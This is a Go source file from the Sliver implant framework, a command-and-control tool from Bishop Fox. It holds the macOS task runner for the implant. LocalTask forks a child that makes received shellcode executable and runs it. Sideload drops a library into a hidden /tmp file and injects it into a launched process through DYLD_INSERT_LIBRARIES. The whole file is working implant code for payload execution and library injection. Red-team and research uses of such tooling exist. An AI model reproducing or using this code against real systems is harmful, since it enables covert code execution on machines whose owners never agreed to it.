package taskrunner

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"fmt"
	"strings"
	"sync"

	//{{if .Config.Debug}}
	"log"
	//{{end}}
	"os"
	"os/exec"
	"runtime"
	"syscall"
	"unsafe"
)

//go:linkname localTaskBeforeFork syscall.runtime_BeforeFork
func localTaskBeforeFork()

//go:linkname localTaskAfterFork syscall.runtime_AfterFork
func localTaskAfterFork()

//go:linkname localTaskAfterForkInChild syscall.runtime_AfterForkInChild
func localTaskAfterForkInChild()

// LocalTask - Run shellcode in a forked child; blocks until the child exits.
// Forking isolates the beacon from payloads that exit/execve (issue #2237).
func LocalTask(data []byte, rwxPages bool) error {
	dataAddr := uintptr(unsafe.Pointer(&data[0]))
	page := getPage(dataAddr)
	pageAddr := uintptr(unsafe.Pointer(&page[0]))
	pageLen := uintptr(len(page))
	dataPtr := unsafe.Pointer(&data)
	// funcPtr trick from hershell (https://github.com/lesnuages/hershell)
	funcPtr := *(*func())(unsafe.Pointer(&dataPtr))

	runtime.LockOSThread()
	localTaskBeforeFork()
	// Raw SYS_FORK on Darwin: r0 holds child's pid in BOTH processes; r1==1
	// flags the child (libSystem's fork() wrapper hides this).
	r0, isChild, errno := syscall.RawSyscall(syscall.SYS_FORK, 0, 0, 0)
	if errno != 0 {
		localTaskAfterFork()
		runtime.UnlockOSThread()
		return errno
	}
	if isChild == 1 {
		localTaskAfterForkInChild()
		for fd := uintptr(3); fd < 1024; fd++ {
			syscall.RawSyscall(syscall.SYS_CLOSE, fd, 0, 0)
		}
		syscall.RawSyscall(syscall.SYS_MPROTECT, pageAddr, pageLen, uintptr(syscall.PROT_READ|syscall.PROT_EXEC))
		funcPtr()
		for {
			syscall.RawSyscall(syscall.SYS_EXIT, 0, 0, 0)
		}
	}
	localTaskAfterFork()
	var ws syscall.WaitStatus
	_, err := syscall.Wait4(int(r0), &ws, 0, nil)
	runtime.UnlockOSThread()
	if err != nil {
		return err
	}
	if ws.Signaled() {
		return fmt.Errorf("shellcode child killed by signal %v", ws.Signal())
	}
	if ws.ExitStatus() != 0 {
		return fmt.Errorf("shellcode child exited %d", ws.ExitStatus())
	}
	return nil
}

// RemoteTask -
func RemoteTask(processID int, data []byte, rwxPages bool) error {
	return nil
}

// Sideload - Side load a library and return its output
func Sideload(procName string, procArgs []string, _ uint32, data []byte, args []string, kill bool) (string, error) {
	var (
		stdOut bytes.Buffer
		stdErr bytes.Buffer
		wg     sync.WaitGroup
		cmd    *exec.Cmd
	)
	fdPath := fmt.Sprintf("/tmp/.%s", RandomString(10))
	err := os.WriteFile(fdPath, data, 0755)
	if err != nil {
		return "", err
	}
	env := os.Environ()
	newEnv := []string{
		fmt.Sprintf("LD_PARAMS=%s", strings.Join(args, " ")),
		fmt.Sprintf("DYLD_INSERT_LIBRARIES=%s", fdPath),
	}
	env = append(env, newEnv...)
	if len(procArgs) > 0 {
		cmd = exec.Command(procName, procArgs...)
	} else {
		cmd = exec.Command(procName)
	}
	cmd.Env = env
	cmd.Stdout = &stdOut
	cmd.Stderr = &stdErr
	//{{if .Config.Debug}}
	log.Printf("Starting %s\n", cmd.String())
	//{{end}}
	wg.Add(1)
	go startAndWait(cmd, &wg)
	// Wait for process to terminate
	wg.Wait()
	// Cleanup
	os.Remove(fdPath)

	if len(stdErr.Bytes()) > 0 {
		return "", fmt.Errorf("%s", stdErr.String())
	}
	//{{if .Config.Debug}}
	log.Printf("Done, stdout: %s\n", stdOut.String())
	log.Printf("Done, stderr: %s\n", stdErr.String())
	//{{end}}
	return stdOut.String(), nil
}
